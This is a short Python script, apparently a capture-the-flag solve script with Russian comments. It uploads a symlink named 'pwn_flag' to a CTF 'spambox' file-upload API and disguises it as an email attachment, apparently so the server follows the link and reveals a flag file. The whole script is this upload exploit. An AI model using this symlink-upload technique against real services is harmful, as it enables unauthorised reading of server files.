import requests

# Открываем symlink как есть, без разыменования
with open('pwn_flag', 'rb') as f:
    files = {
        'files': ('pwn.eml', f, 'message/rfc822')  # маскируем под email
    }
    cookies = {
        '__cfduid': 'f0eef77a6e6a85f0c58d1164d32da8f8'
    }
    url = 'https://ywze1zwd.spambox.alfactf.ru/api/files'

    r = requests.post(url, files=files, cookies=cookies)

print(r.status_code)
print(r.text)